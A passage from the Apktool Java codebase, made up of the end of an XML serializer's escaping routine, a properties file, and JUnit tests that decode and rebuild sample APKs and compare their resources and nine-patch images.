					} else {
						if (TRACE_ESCAPING)
							System.err.println(getClass().getName() + " DEBUG TEXT value.len=" + text.length()
									+ " " + printable(text));
						throw new IllegalStateException("character " + Integer.toString(ch)
								+ " is not allowed in output" + getLocation()
								+ " (text value=" + printable(text) + ")");
					}
				}
				if (seenBracket) {
					seenBracketBracket = seenBracket = false;
				}

			}
		}
		if (pos > 0) {
			out.write(text.substring(pos));
		} else {
			out.write(text); // this is shortcut to the most common case
		}

	}

	protected void writeElementContent(char[] buf, int off, int len, Writer out)
			throws IOException {
		// escape '<', '&', ']]>'
		final int end = off + len;
		int pos = off;
		for (int i = off; i < end; i++) {
			final char ch = buf[i];
			if (ch == ']') {
				if (seenBracket) {
					seenBracketBracket = true;
				} else {
					seenBracket = true;
				}
			} else {
				if (ch == '&') {
					if (i > pos) {
						out.write(buf, pos, i - pos);
					}
					out.write("&amp;");
					pos = i + 1;
				} else if (ch == '<') {
					if (i > pos) {
						out.write(buf, pos, i - pos);
					}
					out.write("&lt;");
					pos = i + 1;

				} else if (seenBracketBracket && ch == '>') {
					if (i > pos) {
						out.write(buf, pos, i - pos);
					}
					out.write("&gt;");
					pos = i + 1;
				} else if (ch < 32) {
					// in XML 1.0 only legal character are #x9 | #xA | #xD
					if (ch == 9 || ch == 10 || ch == 13) {
						// pass through
					} else {
						if (TRACE_ESCAPING)
							System.err.println(getClass().getName() + " DEBUG TEXT value.len=" + len + " "
									+ printable(new String(buf, off, len)));
						throw new IllegalStateException("character "
								+ printable(ch) + " (" + Integer.toString(ch)
								+ ") is not allowed in output" + getLocation());
					}
				}
				if (seenBracket) {
					seenBracketBracket = seenBracket = false;
				}
			}
		}
		if (end > pos) {
			out.write(buf, pos, end - pos);
		}
	}

	protected static String printable(String s) {
		if (s == null) {
			return "null";
		}
		StringBuffer retval = new StringBuffer(s.length() + 16);
		retval.append("'");
		for (int i = 0; i < s.length(); i++) {
			addPrintable(retval, s.charAt(i));
		}
		retval.append("'");
		return retval.toString();
	}

	protected static String printable(char ch) {
		StringBuffer retval = new StringBuffer();
		addPrintable(retval, ch);
		return retval.toString();
	}

	private static void addPrintable(StringBuffer retval, char ch) {
		switch (ch) {
		case '\b':
			retval.append("\\b");
			break;
		case '\t':
			retval.append("\\t");
			break;
		case '\n':
			retval.append("\\n");
			break;
		case '\f':
			retval.append("\\f");
			break;
		case '\r':
			retval.append("\\r");
			break;
		case '\"':
			retval.append("\\\"");
			break;
		case '\'':
			retval.append("\\'");
			break;
		case '\\':
			retval.append("\\\\");
			break;
		default:
			if (ch < 0x20 || ch > 0x7e) {
				final String ss = "0000" + Integer.toString(ch, 16);
				retval.append("\\u").append(ss.substring(ss.length() - 4));
			} else {
				retval.append(ch);
			}
		}
	}
}

```

`brut.apktool/apktool-lib/src/main/resources/properties/apktool.properties`:

```properties
application.version=@version@
git.commit.id.abbrev=@gitrev@

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/BaseTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.MetaInfo;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.directory.FileDirectory;
import org.custommonkey.xmlunit.*;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.Reader;
import java.util.Map;
import java.util.Set;
import java.util.logging.Logger;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.*;

public class BaseTest {

    protected void compareUnknownFiles() throws BrutException {
        MetaInfo control = new Androlib().readMetaFile(sTestOrigDir);
        MetaInfo test = new Androlib().readMetaFile(sTestNewDir);
        assertNotNull(control.unknownFiles);
        assertNotNull(test.unknownFiles);

        Map<String, String> controlFiles = control.unknownFiles;
        Map<String, String> testFiles = test.unknownFiles;
        assertEquals(controlFiles.size(), testFiles.size());

        // Make sure that the compression methods are still the same
        for (Map.Entry<String, String> controlEntry : controlFiles.entrySet()) {
            assertEquals(controlEntry.getValue(), testFiles.get(controlEntry.getKey()));
        }
    }

    protected void compareBinaryFolder(String path, boolean res) throws BrutException, IOException {
        boolean exists = true;

        String prefixPath = "";
        if (res) {
            prefixPath = File.separatorChar + "res" + File.separatorChar;
        }

        String location = prefixPath + path;

        FileDirectory fileDirectory = new FileDirectory(sTestOrigDir, location);

        Set<String> files = fileDirectory.getFiles(true);
        for (String filename : files) {

            File control = new File((sTestOrigDir + location), filename);
            File test =  new File((sTestNewDir + location), filename);

            if (! test.isFile() || ! control.isFile()) {
                exists = false;
            }
        }

        assertTrue(exists);
    }

    protected void compareResFolder(String path) throws BrutException, IOException {
        compareBinaryFolder(path, true);
    }

    protected void compareLibsFolder(String path) throws BrutException, IOException {
        compareBinaryFolder(File.separatorChar + path, false);
    }

    protected void compareAssetsFolder(String path) throws BrutException, IOException {
        compareBinaryFolder(File.separatorChar + "assets" + File.separatorChar + path, false);
    }

    protected void compareValuesFiles(String path) throws BrutException {
        compareXmlFiles("res/" + path, new ElementNameAndAttributeQualifier("name"));
    }

    protected void compareXmlFiles(String path) throws BrutException {
        compareXmlFiles(path, null);
    }

    protected  void checkFolderExists(String path) {
        File f =  new File(sTestNewDir, path);

        assertTrue(f.isDirectory());
    }

    protected boolean isTransparent(int pixel) {
        return pixel >> 24 == 0x00;
    }

    private void compareXmlFiles(String path, ElementQualifier qualifier) throws BrutException {
        DetailedDiff diff;
        try {
            Reader control = new FileReader(new File(sTestOrigDir, path));
            Reader test = new FileReader(new File(sTestNewDir, path));

            if (qualifier == null) {
                XMLUnit.setIgnoreWhitespace(true);
                XMLUnit.setIgnoreAttributeOrder(true);
                XMLUnit.setCompareUnmatched(false);
                assertXMLEqual(control, test);
                return;
            }

            diff = new DetailedDiff(new Diff(control, test));
        } catch (SAXException | IOException ex) {
            throw new BrutException(ex);
        }

        diff.overrideElementQualifier(qualifier);
        assertTrue(path + ": " + diff.getAllDifferences().toString(), diff.similar());
    }

    protected static ExtFile sTmpDir;
    protected static ExtFile sTestOrigDir;
    protected static ExtFile sTestNewDir;

    protected final static Logger LOGGER = Logger.getLogger(BaseTest.class.getName());
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/TestUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.options.BuildOptions;
import brut.androlib.res.AndrolibResources;
import brut.common.BrutException;
import brut.directory.DirUtil;
import brut.directory.Directory;
import brut.directory.FileDirectory;
import brut.util.OS;
import org.custommonkey.xmlunit.ElementQualifier;
import org.w3c.dom.Element;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.*;
import java.net.URL;
import java.net.URLDecoder;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Map;

public abstract class TestUtils {

    public static Map<String, String> parseStringsXml(File file)
            throws BrutException {
        try {
            XmlPullParser xpp = XmlPullParserFactory.newInstance().newPullParser();
            xpp.setInput(new FileReader(file));

            int eventType;
            String key = null;
            Map<String, String> map = new HashMap<>();
            while ((eventType = xpp.next()) != XmlPullParser.END_DOCUMENT) {
                switch (eventType) {
                    case XmlPullParser.START_TAG:
                        if ("string".equals(xpp.getName())) {
                            int attrCount = xpp.getAttributeCount();
                            for (int i = 0; i < attrCount; i++) {
                                if ("name".equals(xpp.getAttributeName(i))) {
                                    key = xpp.getAttributeValue(i);
                                    break;
                                }
                            }
                        }
                        break;
                    case XmlPullParser.END_TAG:
                        if ("string".equals(xpp.getName())) {
                            key = null;
                        }
                        break;
                    case XmlPullParser.TEXT:
                        if (key != null) {
                            map.put(key, xpp.getText());
                        }
                        break;
                }
            }

            return map;
        } catch (IOException | XmlPullParserException ex) {
            throw new BrutException(ex);
        }
    }

    public static void copyResourceDir(Class<?> class_, String dirPath, File out) throws BrutException {
        if (!out.exists()) {
            out.mkdirs();
        }
        copyResourceDir(class_, dirPath, new FileDirectory(out));
    }

    public static void copyResourceDir(Class<?> class_, String dirPath, Directory out) throws BrutException {
        if (class_ == null) {
            class_ = Class.class;
        }

        URL dirURL = class_.getClassLoader().getResource(dirPath);
        if (dirURL != null && dirURL.getProtocol().equals("file")) {
            try {
                DirUtil.copyToDir(new FileDirectory(dirURL.getFile()), out);
            } catch (UnsupportedEncodingException ex) {
                throw new BrutException(ex);
            }
            return;
        }

        if (dirURL == null) {
            String className = class_.getName().replace(".", "/") + ".class";
            dirURL = class_.getClassLoader().getResource(className);
        }

        if (dirURL.getProtocol().equals("jar")) {
            String jarPath;
            try {
                jarPath = URLDecoder.decode(dirURL.getPath().substring(5, dirURL.getPath().indexOf("!")), "UTF-8");
                DirUtil.copyToDir(new FileDirectory(jarPath), out);
            } catch (UnsupportedEncodingException ex) {
                throw new BrutException(ex);
            }
        }
    }

    public static void cleanFrameworkFile() throws BrutException {
        File framework = new File(getFrameworkDir(), "1.apk");

        if (Files.exists(framework.toPath())) {
            OS.rmfile(framework.getAbsolutePath());
        }
    }

    public static byte[] readHeaderOfFile(File file, int size) throws IOException {
        byte[] buffer = new byte[size];
        InputStream inputStream = new FileInputStream(file);
        if (inputStream.read(buffer) != buffer.length) {
            throw new IOException("File size too small for buffer length: " + size);
        }
        inputStream.close();

        return buffer;
    }

    static File getFrameworkDir() throws AndrolibException {
        AndrolibResources androlibResources = new AndrolibResources();
        androlibResources.buildOptions = new BuildOptions();
        return androlibResources.getFrameworkDir();
    }

    public static class ResValueElementQualifier implements ElementQualifier {

        @Override
        public boolean qualifyForComparison(Element control, Element test) {
            String controlType = control.getTagName();
            if ("item".equals(controlType)) {
                controlType = control.getAttribute("type");
            }

            String testType = test.getTagName();
            if ("item".equals(testType)) {
                testType = test.getAttribute("type");
            }

            return controlType.equals(testType) && control.getAttribute("name").equals(test.getAttribute("name"));
        }
    }

    public static String replaceNewlines(String value) {
        return value.replace("\n", "").replace("\r", "");
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/AndroidOreoNotSparseTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;

import static org.junit.Assert.assertTrue;

public class AndroidOreoNotSparseTest extends BaseTest {
    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue1594-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue1594-new");
        LOGGER.info("Unpacking not_sparse.apk...");
        TestUtils.copyResourceDir(AndroidOreoNotSparseTest.class, "aapt1/issue1594", sTestOrigDir);

        File testApk = new File(sTestOrigDir, "not_sparse.apk");

        LOGGER.info("Decoding not_sparse.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();

        LOGGER.info("Building not_sparse.apk...");
        BuildOptions buildOptions = new BuildOptions();
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertTrue(sTestOrigDir.isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/AndroidOreoSparseTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;

import static org.junit.Assert.assertTrue;

public class AndroidOreoSparseTest extends BaseTest {
    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue1594-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue1594-new");
        LOGGER.info("Unpacking sparse.apk...");
        TestUtils.copyResourceDir(AndroidOreoSparseTest.class, "aapt1/issue1594", sTestOrigDir);

        File testApk = new File(sTestOrigDir, "sparse.apk");

        LOGGER.info("Decoding sparse.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();

        LOGGER.info("Building sparse.apk...");
        BuildOptions buildOptions = new BuildOptions();
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertTrue(sTestOrigDir.isDirectory());
    }

    @Test
    public void ensureStringsOreoTest() {
        assertTrue((new File(sTestNewDir, "res/values-v26/strings.xml").isFile()));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/BuildAndDecodeJarTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;

import static org.junit.Assert.assertTrue;

public class BuildAndDecodeJarTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "testjar-orig");
        sTestNewDir = new ExtFile(sTmpDir, "testjar-new");
        LOGGER.info("Unpacking testjar...");
        TestUtils.copyResourceDir(BuildAndDecodeJarTest.class, "aapt1/testjar/", sTestOrigDir);

        LOGGER.info("Building testjar.jar...");
        File testJar = new File(sTmpDir, "testjar.jar");
        new Androlib().build(sTestOrigDir, testJar);

        LOGGER.info("Decoding testjar.jar...");
        ApkDecoder apkDecoder = new ApkDecoder(testJar);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/BuildAndDecodeTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.meta.MetaInfo;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import brut.util.OSDetection;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.Map;

import static org.junit.Assert.*;
import static org.junit.Assume.assumeTrue;

public class BuildAndDecodeTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "testapp-orig");
        sTestNewDir = new ExtFile(sTmpDir, "testapp-new");
        LOGGER.info("Unpacking testapp...");
        TestUtils.copyResourceDir(BuildAndDecodeTest.class, "aapt1/testapp/", sTestOrigDir);

        LOGGER.info("Building testapp.apk...");
        File testApk = new File(sTmpDir, "testapp.apk");
        new Androlib().build(sTestOrigDir, testApk);

        LOGGER.info("Decoding testapp.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void manifestTaggingNotSupressed() throws BrutException {
        compareXmlFiles("AndroidManifest.xml");
    }

    @Test
    public void valuesAnimsTest() throws BrutException {
        compareValuesFiles("values-mcc001/anims.xml");
    }

    @Test
    public void valuesArraysTest() throws BrutException {
        compareValuesFiles("values-mcc001/arrays.xml");
    }

    @Test
    public void valuesArraysCastingTest() throws BrutException {
        compareValuesFiles("values-mcc002/arrays.xml");
        compareValuesFiles("values-mcc003/arrays.xml");
    }

    @Test
    public void valuesAttrsTest() throws BrutException {
        compareValuesFiles("values/attrs.xml");
    }

    @Test
    public void valuesBoolsTest() throws BrutException {
        compareValuesFiles("values-mcc001/bools.xml");
    }

    @Test
    public void valuesColorsTest() throws BrutException {
        compareValuesFiles("values-mcc001/colors.xml");
    }

    @Test
    public void bug702Test() throws BrutException {
        compareValuesFiles("values-mcc001-mnc00/strings.xml");
    }

    @Test
    public void valuesDimensTest() throws BrutException {
        compareValuesFiles("values-mcc001/dimens.xml");
    }

    @Test
    public void valuesDrawablesTest() throws BrutException {
        compareValuesFiles("values-mcc001/drawables.xml");
    }

    @Test
    public void valuesIdsTest() throws BrutException {
        compareValuesFiles("values-mcc001/ids.xml");
    }

    @Test
    public void valuesIntegersTest() throws BrutException {
        compareValuesFiles("values-mcc001/integers.xml");
    }

    @Test
    public void valuesLayoutsTest() throws BrutException {
        compareValuesFiles("values-mcc001/layouts.xml");
    }

    @Test
    public void xmlPluralsTest() throws BrutException {
        compareValuesFiles("values-mcc001/plurals.xml");
    }

    @Test
    public void valuesStringsTest() throws BrutException {
        compareValuesFiles("values-mcc001/strings.xml");
    }

    @Test
    public void valuesStylesTest() throws BrutException {
        compareValuesFiles("values-mcc001/styles.xml");
    }

    @Test
    public void valuesReferencesTest() throws BrutException {
        compareValuesFiles("values-mcc002/strings.xml");
    }

    @Test
    public void valuesExtraLongTest() throws BrutException {
        compareValuesFiles("values-en/strings.xml");
    }

    @Test
    public void valuesExtraLongExactLengthTest() throws BrutException {
        Map<String, String> strs = TestUtils.parseStringsXml(new File(sTestNewDir, "res/values-en/strings.xml"));

        // long_string6 should be exactly 0x8888 chars of "a"
        // the valuesExtraLongTest() should handle this
        // but such an edge case, want a specific test
        String aaaa = strs.get("long_string6");
        assertEquals(0x8888, aaaa.length());
    }

    @Test
    public void storedMp3FilesAreNotCompressedTest() throws BrutException {
        ExtFile extFile = new ExtFile(sTmpDir, "testapp.apk");
        Integer built = extFile.getDirectory().getCompressionLevel("res/raw/rain.mp3");
        assertEquals(Integer.valueOf(0), built);
    }

    @Test
    public void crossTypeTest() throws BrutException {
        compareValuesFiles("values-mcc003/strings.xml");
        compareValuesFiles("values-mcc003/integers.xml");
        compareValuesFiles("values-mcc003/bools.xml");
    }

    @Test
    public void xmlLiteralsTest() throws BrutException {
        compareXmlFiles("res/xml/literals.xml");
    }

    @Test
    public void xmlReferencesTest() throws BrutException {
        compareXmlFiles("res/xml/references.xml");
    }

    @Test
    public void xmlXsdFileTest() throws BrutException {
        compareXmlFiles("res/xml/ww_box_styles_schema.xsd");
    }

    @Test
    public void xmlIdsEmptyTest() throws BrutException {
        compareXmlFiles("res/values/ids.xml");
    }

    @Test
    public void xmlReferenceAttributeTest() throws BrutException {
        compareXmlFiles("res/layout/issue1040.xml");
    }

    @Test
    public void xmlCustomAttributeTest() throws BrutException {
        compareXmlFiles("res/layout/issue1063.xml");
    }

    @Test
    public void xmlSmallNumbersDontEscapeTest() throws BrutException {
        compareXmlFiles("res/layout/issue1130.xml");
    }

    @Test
    public void xmlUniformAutoTextTest() throws BrutException {
        compareXmlFiles("res/layout/issue1674.xml");
    }

    @Test(expected = AssertionError.class)
    public void xmlFillParentBecomesMatchTest() throws BrutException {
        compareXmlFiles("res/layout/issue1274.xml");
    }

    @Test
    public void xmlCustomAttrsNotAndroidTest() throws BrutException {
        compareXmlFiles("res/layout/issue1157.xml");
    }

    @Test
    public void qualifiersTest() throws BrutException {
        compareValuesFiles("values-mcc004-mnc4-en-rUS-ldrtl-sw100dp-w200dp-h300dp"
                + "-long-round-highdr-land-desk-night-xhdpi-finger-keyssoft-12key"
                + "-navhidden-dpad-v26/strings.xml");
    }

    @Test
    public void shortendedMncTest() throws BrutException {
        compareValuesFiles("values-mcc001-mnc1/strings.xml");
    }

    @Test
    public void shortMncHtcTest() throws BrutException {
        compareValuesFiles("values-mnc1/strings.xml");
    }

    @Test
    public void shortMncv2Test() throws BrutException {
        compareValuesFiles("values-mcc238-mnc6/strings.xml");
    }

    @Test
    public void longMncTest() throws BrutException {
        compareValuesFiles("values-mcc238-mnc870/strings.xml");
    }

    @Test
    public void anyDpiTest() throws BrutException {
        compareValuesFiles("values-watch/strings.xml");
    }

    @Test
    public void packed3CharsTest() throws BrutException {
        compareValuesFiles("values-ast-rES/strings.xml");
    }

    @Test
    public void rightToLeftTest() throws BrutException {
        compareValuesFiles("values-ldrtl/strings.xml");
    }

    @Test
    public void scriptBcp47Test() throws BrutException {
        compareValuesFiles("values-b+en+Latn+US/strings.xml");
    }

    @Test
    public void threeLetterLangBcp47Test() throws BrutException {
        compareValuesFiles("values-ast/strings.xml");
    }

    @Test
    public void androidOStringTest() throws BrutException {
        compareValuesFiles("values-ast/strings.xml");
    }

    @Test
    public void twoLetterNotHandledAsBcpTest() {
        checkFolderExists("res/values-fr");
    }

    @Test
    public void twoLetterLangBcp47Test() throws BrutException {
        compareValuesFiles("values-en-rUS/strings.xml");
    }

    @Test
    public void variantBcp47Test() throws BrutException {
        compareValuesFiles("values-b+en+US+POSIX/strings.xml");
    }

    @Test
    public void fourpartBcp47Test() throws BrutException {
        compareValuesFiles("values-b+ast+Latn+IT+AREVELA/strings.xml");
    }

    @Test
    public void RegionLocaleBcp47Test() throws BrutException {
        compareValuesFiles("values-b+en+Latn+419/strings.xml");
    }

    @Test
    public void numericalRegionBcp47Test() throws BrutException {
        compareValuesFiles("values-b+eng+419/strings.xml");
    }

    @Test
    public void api23ConfigurationsTest() throws BrutException {
        compareValuesFiles("values-round/strings.xml");
        compareValuesFiles("values-notround/strings.xml");
    }

    @Test
    public void api26ConfigurationsTest() throws BrutException {
        compareValuesFiles("values-widecg-v26/strings.xml");
        compareValuesFiles("values-lowdr-v26/strings.xml");
        compareValuesFiles("values-nowidecg-v26/strings.xml");
        compareValuesFiles("values-vrheadset-v26/strings.xml");
    }

    @Test
    public void fontTest() throws BrutException {
        File fontXml = new File((sTestNewDir + "/res/font"), "lobster.xml");
        File fontFile = new File((sTestNewDir + "/res/font"), "lobster_regular.otf");

        // Per #1662, ensure font file is not encoded.
        assertTrue(fontXml.isFile());
        compareXmlFiles("/res/font/lobster.xml");

        // If we properly skipped decoding the font (otf) file, this file should not exist
        assertFalse((new File((sTestNewDir + "/res/values"), "fonts.xml")).isFile());
        assertTrue(fontFile.isFile());
    }

    @Test
    public void drawableNoDpiTest() throws BrutException, IOException {
        compareResFolder("drawable-nodpi");
    }

    @Test
    public void drawableAnyDpiTest() throws BrutException, IOException {
        compareResFolder("drawable-anydpi");
    }

    @Test
    public void drawableNumberedDpiTest() throws BrutException, IOException {
        compareResFolder("drawable-534dpi");
    }

    @Test
    public void drawableLdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-ldpi");
    }

    @Test
    public void drawableMdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-mdpi");
    }

    @Test
    public void drawableTvdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-tvdpi");
    }

    @Test
    public void drawableXhdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-xhdpi");
    }

    @Test
    public void ninePatchImageColorTest() throws IOException {
        char slash = File.separatorChar;
        String location = slash + "res" + slash + "drawable-xhdpi" + slash;

        File control = new File((sTestOrigDir + location), "9patch.9.png");
        File test =  new File((sTestNewDir + location), "9patch.9.png");

        BufferedImage controlImage = ImageIO.read(control);
        BufferedImage testImage = ImageIO.read(test);

        // lets start with 0,0 - empty
        assertEquals(controlImage.getRGB(0, 0), testImage.getRGB(0, 0));

        // then with 30, 0 - black
        assertEquals(controlImage.getRGB(30, 0), testImage.getRGB(30, 0));

        // then 30, 30 - blue
        assertEquals(controlImage.getRGB(30, 30), testImage.getRGB(30, 30));
    }

    @Test
    public void issue1508Test() throws IOException {
        char slash = File.separatorChar;
        String location = slash + "res" + slash + "drawable-xhdpi" + slash;

        File control = new File((sTestOrigDir + location), "btn_zoom_up_normal.9.png");
        File test = new File((sTestNewDir + location), "btn_zoom_up_normal.9.png");

        BufferedImage controlImage = ImageIO.read(control);
        BufferedImage testImage = ImageIO.read(test);

        // 0, 0 = clear
        assertEquals(controlImage.getRGB(0, 0), testImage.getRGB(0, 0));

        // 30, 0 = black line
        assertEquals(controlImage.getRGB(0, 30), testImage.getRGB(0, 30));

        // 30, 30 = greyish button
        assertEquals(controlImage.getRGB(30, 30), testImage.getRGB(30, 30));
    }

    @Test
    public void issue1511Test() throws IOException {
        char slash = File.separatorChar;
        String location = slash + "res" + slash + "drawable-xxhdpi" + slash;

        File control = new File((sTestOrigDir + location), "textfield_activated_holo_dark.9.png");
        File test = new File((sTestNewDir + location), "textfield_activated_holo_dark.9.png");

        BufferedImage controlImage = ImageIO.read(control);
        BufferedImage testImage = ImageIO.read(test);

        // Check entire image as we cannot mess this up
        final int w = controlImage.getWidth(),
                  h = controlImage.getHeight();

        final int[] controlImageGrid = controlImage.getRGB(0, 0, w, h, null, 0, w);
        final int[] testImageGrid = testImage.getRGB(0, 0, w, h, null, 0, w);

        for (int i = 0; i < controlImageGrid.length; i++) {
            assertEquals("Image lost Optical Bounds at i = " + i, controlImageGrid[i], testImageGrid[i]);
        }
    }

    @Test
    public void robust9patchTest() throws IOException {
        String[] ninePatches = {"ic_notification_overlay.9.png", "status_background.9.png",
                "search_bg_transparent.9.png", "screenshot_panel.9.png", "recents_lower_gradient.9.png"};

        char slash = File.separatorChar;
        String location = slash + "res" + slash + "drawable-xxhdpi" + slash;

        for (String ninePatch : ninePatches) {
            File control = new File((sTestOrigDir + location), ninePatch);
            File test = new File((sTestNewDir + location), ninePatch);

            BufferedImage controlImage = ImageIO.read(control);
            BufferedImage testImage = ImageIO.read(test);

            int w = controlImage.getWidth(), h = controlImage.getHeight();

            // Check the entire horizontal line
